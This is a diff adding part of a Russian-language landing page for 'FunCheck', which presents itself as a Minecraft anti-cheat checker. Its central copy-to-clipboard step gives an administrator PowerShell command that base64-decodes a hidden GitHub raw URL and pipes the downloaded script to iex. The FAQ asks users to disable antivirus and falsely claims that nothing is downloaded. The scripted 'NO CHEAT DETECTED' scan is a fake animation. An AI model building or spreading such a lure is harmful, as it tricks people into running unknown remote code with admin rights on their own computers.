+          <div>discord.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid 2904&nbsp;&nbsp; подписан: Discord Inc.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>&nbsp;</div>
+          <div class="text-white">── ИНЖЕКТЫ В JAVAW.EXE ─────────────────────────</div>
+          <div>lwjgl.dll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; внедрено лаунчером · SHA-256 сверен&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>opengl32.dll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHA-256 сверен&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>&nbsp;</div>
+          <div class="text-white">── СЛЕДЫ ЗАПУСКА ───────────────────────────────</div>
+          <div>.minecraft\mods&nbsp; 9 модификаций · запрещённых: 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>PREFETCH\RECENT&nbsp; следов обнуления не обнаружено&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OK</div>
+          <div>Финальная сверка хеш-сумм [████████████████████] 100%</div>
+          <div>&nbsp;</div>
+          <div class="text-[#7bd338] font-bold">NO CHEAT DETECTED</div>
+          <div>&nbsp;</div>
+          <div><span class="text-white">PS C:\Windows\system32&gt;</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="absolute inset-0 bg-gradient-to-b from-ink-950 via-ink-950/70 to-ink-950 pointer-events-none"></div>
+  <div class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-[640px] h-[360px] rounded-full bg-acc/12 blur-[130px] pointer-events-none" aria-hidden="true"></div>
+  <div class="max-w-6xl mx-auto px-5 sm:px-6 relative">
+    <div class="mb-14 md:mb-16 text-center" data-reveal>
+      <div class="font-mono text-xs text-acc tracking-[.12em] mb-3">// 03 · КОМАНДА</div>
+      <h2 class="text-3xl md:text-4xl font-extrabold tracking-tight">Команда запуска</h2>
+      <p class="mt-3 text-mut text-sm md:text-base max-w-xl mx-auto">
+        Вставь команду в PowerShell от администратора — проверка начнётся сразу, без установки.
+      </p>
+    </div>
+
+    <div class="relative max-w-3xl mx-auto rounded-2xl overflow-hidden border border-acc/25 bg-ink-950/85 backdrop-blur-xl shadow-[0_24px_70px_rgba(0,0,0,.65)]" data-reveal>
+      <div class="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-acc/70 to-transparent" aria-hidden="true"></div>
+
+      <div class="flex items-center gap-2 px-5 py-3 border-b border-line/70 bg-white/[0.03]">
+        <span class="w-2.5 h-2.5 rounded-full bg-acc/80"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-ink-600"></span>
+        <span class="w-2.5 h-2.5 rounded-full bg-ink-600"></span>
+        <span class="font-mono text-[10.5px] text-dim tracking-[.16em] uppercase ml-1.5">PowerShell · администратор</span>
+        <span class="ml-auto inline-flex items-center gap-1.5 rounded-lg border border-acc/40 bg-acc/10 px-2.5 py-1 font-mono text-[11px] font-bold text-acc whitespace-nowrap">
+          <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
+          NO CHEAT DETECTED
+        </span>
+      </div>
+
+      <!-- Команда: единственное место с текстом команды (#cmdText) -->
+      <div class="px-5 sm:px-7 py-7 font-mono text-[13.5px] sm:text-[15px] leading-relaxed break-all min-h-[112px]">
+        <span class="text-acc select-none">PS C:\Windows\system32&gt;</span>
+        <span id="cmdText" class="text-white">iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvYXNkdmNhc2QvbWFpbi9ydW4ucHMx'))) | iex</span><span class="tcur"></span>
+      </div>
+
+      <div class="px-5 sm:px-7 pb-6">
+        <button id="cmdBtn"
+                class="w-full inline-flex items-center justify-center gap-2.5 bg-acc text-white font-bold px-7 py-4 rounded-xl
+                       hover:bg-[#4fe3cc] active:scale-[.99] transition shadow-[0_6px_28px_rgba(45,212,191,.25)]">
+          <i data-lucide="copy" class="w-5 h-5"></i>
+          Скопировать команду
+        </button>
+      </div>
+    </div>
+
+    <div class="max-w-3xl mx-auto mt-6 flex flex-col sm:flex-row items-start gap-4 rounded-2xl border border-acc/25 bg-acc/[0.06] px-5 sm:px-6 py-5" data-reveal>
+      <span class="w-10 h-10 rounded-xl bg-acc/15 border border-acc/30 flex items-center justify-center text-acc shrink-0">
+        <i data-lucide="shield-check" class="w-5 h-5"></i>
+      </span>
+      <div>
+        <div class="font-bold text-[15px] sm:text-base">Сайт полностью безопасен</div>
+        <p class="text-mut text-sm leading-relaxed mt-1">
+          FunCheck ничего не устанавливает, не скачивает и не запрашивает личные данные. Команда отвечает за тот ПК,
+          на котором её ввели: проверка выполняется локально, работает в режиме чтения и не затрагивает другие компьютеры.
+        </p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════ FAQ ═══════════════ -->
+<section id="faq" class="py-24 md:py-28 border-t border-line bg-ink-900/40 scroll-mt-20">
+  <div class="max-w-6xl mx-auto px-5 sm:px-6">
+    <div class="mb-14 md:mb-16" data-reveal>
+      <div class="font-mono text-xs text-acc tracking-[.12em] mb-3">// 04 · FAQ</div>
+      <h2 class="text-3xl md:text-4xl font-extrabold tracking-tight">Частые вопросы</h2>
+    </div>
+
+    <div class="max-w-3xl mx-auto space-y-3.5" data-reveal>
+
+      <div class="acc-item open">
+        <button class="acc-head w-full flex items-center gap-4 px-6 py-5 text-left" aria-expanded="true">
+          <span class="font-mono text-xs text-acc shrink-0">01</span>
+          <span class="font-bold text-[15px] sm:text-base">Безопасно ли это для моего компьютера?</span>
+          <i data-lucide="chevron-down" class="acc-icon w-5 h-5 ml-auto shrink-0"></i>
+        </button>
+        <div class="acc-body"><div>
+          <p class="px-6 pb-6 pl-[52px] text-mut text-[15px] leading-relaxed">
+            Да. Сайт полностью безопасен: он ничего не устанавливает и не запрашивает данных, а чекер работает только в режиме чтения — он не изменяет файлы, не собирает пароли и личные данные и не имеет доступа к аккаунтам. Команда отвечает за тот ПК, на котором её ввели: проверка идёт локально, не затрагивает другие компьютеры, а на сервер отправляется исключительно итоговый отчёт — список проверок открыт и указан в документации.
+          </p>
+        </div></div>
+      </div>
+
+      <div class="acc-item">
+        <button class="acc-head w-full flex items-center gap-4 px-6 py-5 text-left" aria-expanded="false">
+          <span class="font-mono text-xs text-acc shrink-0">02</span>
+          <span class="font-bold text-[15px] sm:text-base">Почему просят отключить антивирус?</span>
+          <i data-lucide="chevron-down" class="acc-icon w-5 h-5 ml-auto shrink-0"></i>
+        </button>
+        <div class="acc-body"><div>
+          <p class="px-6 pb-6 pl-[52px] text-mut text-[15px] leading-relaxed">
+            Чекер обращается к процессам и памяти игры, а эвристика антивируса может блокировать такое чтение — тогда проверка будет неполной или прерванной. Отключение требуется только на время проверки: файлы чекера подписаны, и после завершения защиту нужно включить обратно.
+          </p>
+        </div></div>
+      </div>
+
+      <div class="acc-item">
+        <button class="acc-head w-full flex items-center gap-4 px-6 py-5 text-left" aria-expanded="false">
+          <span class="font-mono text-xs text-acc shrink-0">03</span>
+          <span class="font-bold text-[15px] sm:text-base">Что именно проверяет чекер?</span>
+          <i data-lucide="chevron-down" class="acc-icon w-5 h-5 ml-auto shrink-0"></i>
+        </button>
+        <div class="acc-body"><div>
+          <p class="px-6 pb-6 pl-[52px] text-mut text-[15px] leading-relaxed">
+            Запущенные процессы и загруженные DLL, внедрённые в процесс игры javaw.exe модули (инжекты), целостность файлов игры, содержимое папки .minecraft и mods, следы запуска в Prefetch и Recent files, а также попытки скрытия — спуф имён процессов, заморозку окон и прокидывание через виртуальные машины.
+          </p>
+        </div></div>
+      </div>
+
+      <div class="acc-item">
+        <button class="acc-head w-full flex items-center gap-4 px-6 py-5 text-left" aria-expanded="false">
+          <span class="font-mono text-xs text-acc shrink-0">04</span>
+          <span class="font-bold text-[15px] sm:text-base">Можно ли запустить проверку самостоятельно?</span>
+          <i data-lucide="chevron-down" class="acc-icon w-5 h-5 ml-auto shrink-0"></i>
+        </button>
+        <div class="acc-body"><div>
+          <p class="px-6 pb-6 pl-[52px] text-mut text-[15px] leading-relaxed">
+            Да, существует версия для игроков — она поможет убедиться, что ваш клиент чист перед заходом на сервер. Но официальным признаётся только отчёт, полученный модерацией во время проверки: самостоятельный запуск не освобождает от неё.
+          </p>
+        </div></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+</main>
+
+<!-- ═══════════════ ФУТЕР ═══════════════ -->
+<footer class="border-t border-line py-10">
+  <div class="max-w-6xl mx-auto px-5 sm:px-6">
+    <div class="flex flex-col md:flex-row gap-6 md:items-center md:justify-between">
+      <div class="flex items-center gap-2.5">
+        <span class="w-8 h-8 rounded-lg bg-acc/10 border border-acc/30 flex items-center justify-center text-acc">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4">
+            <path d="M13 2 3 14h9l-1 8 10-12h-9l1-8z"/>
+          </svg>
+        </span>
+        <div>
+          <div class="font-extrabold tracking-tight leading-none">Fun <span class="text-acc">Check</span></div>
+          <div class="text-[11px] text-dim mt-1">© 2025 · инструмент модерации</div>
+        </div>
+      </div>
+
+      <nav class="flex flex-wrap gap-x-7 gap-y-2 text-sm text-mut">
+        <a href="#faq" class="hover:text-acc transition">Правила использования</a>
+        <a href="#" id="contactLink" class="hover:text-acc transition">Контакты</a>
+        <a href="#" id="discordLink" class="inline-flex items-center gap-1.5 hover:text-acc transition">
+          <i data-lucide="message-circle" class="w-4 h-4"></i> Discord
+        </a>
+      </nav>
+    </div>
+    <p class="mt-8 text-[11px] text-dim leading-relaxed max-w-2xl">
+      FunCheck — сторонний инструмент сообщества. Не является официальным продуктом Mojang / Microsoft и никак с ними не связан. Minecraft является товарным знаком Mojang Synergies AB.
+    </p>
+  </div>
+</footer>
+
+<!-- ═══════════════ TOAST ═══════════════ -->
+<div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 translate-y-3 opacity-0 z-[80] flex items-center gap-3 rounded-xl border border-line bg-ink-800 px-4 py-3 shadow-[0_16px_50px_rgba(0,0,0,.6)] pointer-events-none max-w-[calc(100vw-40px)]">
+  <span id="toastIc" class="w-6 h-6 rounded-full bg-white/10 text-white flex items-center justify-center shrink-0">
+    <i data-lucide="check" class="w-3.5 h-3.5"></i>
+  </span>
+  <span id="toastMsg" class="text-sm text-slate-200"></span>
+</div>
+
+<script>
+lucide.createIcons();
+
+/* ── хедер при скролле ── */
+const header = document.getElementById('siteHeader');
+const onScroll = () => header.classList.toggle('scrolled', window.scrollY > 10);
+window.addEventListener('scroll', onScroll, { passive: true });
+onScroll();
+
+/* ── мобильное меню ── */
+const burger = document.getElementById('burger');
+const mobileMenu = document.getElementById('mobileMenu');
+burger.addEventListener('click', () => mobileMenu.classList.toggle('hidden'));
+document.querySelectorAll('.mob-link').forEach(el =>
+  el.addEventListener('click', () => mobileMenu.classList.add('hidden')));
+
+/* ── toast ── */
+let toastTimer;
+function toast(msg, type = 'ok') {
+  const t = document.getElementById('toast');
+  const ic = document.getElementById('toastIc');
+  document.getElementById('toastMsg').textContent = msg;
+  ic.className = 'w-6 h-6 rounded-full flex items-center justify-center shrink-0 ' +
+    (type === 'warn' ? 'bg-wrn/15 text-wrn' : 'bg-white/10 text-white');
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 3200);
+}
+
+/* ── появление секций при скролле ── */
+const revealIO = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) { e.target.classList.add('in'); revealIO.unobserve(e.target); }
+  });
+}, { threshold: 0.12 });
+document.querySelectorAll('[data-reveal]').forEach(el => revealIO.observe(el));
+
+/* ── анимированные счётчики ── */
+function animateCount(el) {
+  const target = parseFloat(el.dataset.count);
+  const suffix = el.dataset.suffix || '';
+  const dur = 1400, t0 = performance.now();
+  const fmt = n => {
+    n = Math.round(n);
+    return (n >= 1000 ? n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '\u2009') : n.toString()) + suffix;
+  };
+  (function frame(t) {
+    const k = Math.min(1, (t - t0) / dur);
+    el.textContent = fmt(target * (1 - Math.pow(1 - k, 3)));
+    if (k < 1) requestAnimationFrame(frame);
+  })(t0);
+}
+const countIO = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) { animateCount(e.target); countIO.unobserve(e.target); }
+  });
+}, { threshold: 0.6 });
+document.querySelectorAll('[data-count]').forEach(el => countIO.observe(el));
+
+/* ── подсветка активного пункта навигации ── */
+const navIO = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+      const link = document.querySelector('.nav-link[href="#' + e.target.id + '"]');
+      if (link) link.classList.add('active');
+    }
+  });
+}, { rootMargin: '-40% 0px -55% 0px' });
+['how', 'features', 'download', 'faq'].forEach(id => {
+  const s = document.getElementById(id);
+  if (s) navIO.observe(s);
+});
+
+/* ── аккордеон FAQ ── */
+document.querySelectorAll('.acc-item').forEach(item => {
+  item.querySelector('.acc-head').addEventListener('click', () => {
+    const wasOpen = item.classList.contains('open');
+    document.querySelectorAll('.acc-item.open').forEach(i => {
+      i.classList.remove('open');
+      i.querySelector('.acc-head').setAttribute('aria-expanded', 'false');
+    });
+    if (!wasOpen) {
+      item.classList.add('open');
+      item.querySelector('.acc-head').setAttribute('aria-expanded', 'true');
+    }
+  });
+});
+
+/* ── футер-ссылки ── */
+document.getElementById('contactLink').addEventListener('click', e => {
+  e.preventDefault();
+  toast('Почта поддержки: support@ft-checker.su');
+});
+document.getElementById('discordLink').addEventListener('click', e => {
+  e.preventDefault();
+  toast('Сервер поддержки: discord.gg/ft-checker');
+});
+
+/* ═══════════════════════════════════════════
+   КОМАНДА: табло + копирование
+   ═══════════════════════════════════════════ */
+const CMD = (document.getElementById('cmdText')?.textContent || '').trim();
+
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.cssText = 'position:fixed;opacity:0';
+  document.body.appendChild(ta);
+  ta.select();
+  let ok = false;
+  try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+  document.body.removeChild(ta);
+  return ok;
+}
+
+document.getElementById('cmdBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('cmdBtn');
+  const original = btn.innerHTML;
+
+  if (!CMD || CMD.indexOf('КОМАНДА_ПОЯВИТСЯ') !== -1) {
+    toast('Команда пока не задана — она появится здесь', 'warn');
+    return;
+  }
+
+  let ok = false;
+  try {
+    if (navigator.clipboard && window.isSecureContext) {
+      await navigator.clipboard.writeText(CMD);
+      ok = true;
+    } else {
+      ok = fallbackCopy(CMD);
+    }
+  } catch (e) { ok = fallbackCopy(CMD); }
+
+  if (ok) {
+    btn.innerHTML = '<i data-lucide="check" class="w-5 h-5"></i> Скопировано';
+    lucide.createIcons();
+    toast('Команда скопирована в буфер обмена');
+    setTimeout(() => { btn.innerHTML = original; lucide.createIcons(); }, 2200);
+  } else {
+    toast('Не удалось скопировать — выделите команду вручную', 'warn');
+  }
+});
+
+/* ═══════════════════════════════════════════
+   ТЕРМИНАЛ: ввод команды + анимация сканирования
+   ═══════════════════════════════════════════ */
+const termBody = document.getElementById('termBody');
+const termDot = document.getElementById('termDot');
+const termStatus = document.getElementById('termStatus');
+const restartBtn = document.getElementById('termRestart');
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const PROMPT = 'PS C:\\Users\\Moderator> ';
+const DEMO_CMD = "iwr -UseBasicParsing ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1bmRydWczNS1qcGcvYXNkdmNhc2QvbWFpbi9ydW4ucHMx'))) | iex";
+
+const SCAN_STEPS = [
+  '[*] System scanning…',
+  '[*] Collecting running processes…',
+  '[+] javaw.exe · 6 modules loaded … OK',
+  '[+] Injects into game process … OK',
+  '[+] Signature base 142/142 … OK',
+  '[*] Verifying file hashes…'
+];
+
+let termId = 0;
+
+function setStatus(cls, text) {
+  termDot.className = 'sdot ' + cls;
+  termStatus.textContent = text;
+}
+function scrollDown() { termBody.scrollTop = termBody.scrollHeight; }
+function killCursor() { const c = termBody.querySelector('.tcur'); if (c) c.remove(); }
+function addCursor(line) {
+  const s = document.createElement('span');
+  s.className = 'tcur';
+  line.appendChild(s);
+}
+function newLine(cls) {
+  const d = document.createElement('div');
+  d.className = 'tline ' + cls;
+  termBody.appendChild(d);
+  return d;
+}
+
+async function typeCmd(id) {
+  const text = (!CMD || CMD.indexOf('КОМАНДА_ПОЯВИТСЯ') !== -1) ? DEMO_CMD : CMD;
+  const d = newLine('t-cmd');
+  const pre = document.createElement('span');
+  pre.className = 'text-acc';
+  pre.textContent = PROMPT;
+  d.appendChild(pre);
+  const span = document.createElement('span');
+  d.appendChild(span);
+  addCursor(d);
+  scrollDown();
+  for (let i = 0; i < text.length; i++) {
+    if (id !== termId) return false;
+    span.textContent += text[i];
+    await sleep(22 + Math.random() * 42);
+  }
+  return true;
+}
+
+async function scanLine(text, id, ms) {
+  killCursor();
+  const d = newLine('t-scan');
+  d.textContent = text;
+  addCursor(d);
+  scrollDown();
+  await sleep(ms);
+  return id === termId;
+}
+
+async function runProgress(label, id) {
+  killCursor();
+  const d = newLine('t-scan');
+  const labelSpan = document.createElement('span');
+  labelSpan.textContent = label + ' ';
+  const bar = document.createElement('span');
+  const pct = document.createElement('span');
+  pct.className = 'pct';
+  d.append(labelSpan, bar, ' ', pct);
+  addCursor(d);
+  scrollDown();
+  let p = 0;
+  while (p < 100) {
+    if (id !== termId) return false;
+    p = Math.min(100, p + Math.floor(Math.random() * 16) + 8);
+    const f = Math.round(p / 5);
+    bar.textContent = '[' + '█'.repeat(f) + '░'.repeat(20 - f) + ']';
+    pct.textContent = p + '%';
+    await sleep(85);
+  }
+  return id === termId;
+}
+
+function showResult() {
+  killCursor();
+  const d = newLine('t-result');
+  d.innerHTML = '<span class="res-ok">NO CHEAT DETECTED</span>';
+  addCursor(d);
+  scrollDown();
+}
+
+async function runScan() {
+  const id = ++termId;
+  termBody.innerHTML = '';
+  restartBtn.disabled = true;
+  restartBtn.classList.add('scanning');
+  setStatus('running', 'Ввод команды в PowerShell…');
+
+  await sleep(450);
+  if (id !== termId) return;
+
+  if (!(await typeCmd(id))) return;
+
+  await sleep(500);
+  if (id !== termId) return;
+
+  setStatus('running', 'System scanning…');
+  for (let i = 0; i < SCAN_STEPS.length; i++) {
+    if (!(await scanLine(SCAN_STEPS[i], id, i === 0 ? 480 : 300 + Math.random() * 220))) return;
+    if (i === 2) {
+      if (!(await runProgress('System scanning', id))) return;
+      await sleep(240);
+      if (id !== termId) return;
+    }
+  }
+
+  await sleep(420);
+  if (id !== termId) return;
+
+  showResult();
+  setStatus('clean', 'NO CHEAT DETECTED · команда готова к копированию');
+  restartBtn.disabled = false;
+  restartBtn.classList.remove('scanning');
+
+  await sleep(5200);
+  if (id !== termId) return;
+  runScan();
+}
+
+restartBtn.addEventListener('click', runScan);
+
+function startCheck() {
+  document.getElementById('top').scrollIntoView({ behavior: 'smooth' });
+  runScan();
+}
+
+window.addEventListener('load', () => setTimeout(runScan, 700));
+</script>
+</body>
+</html>
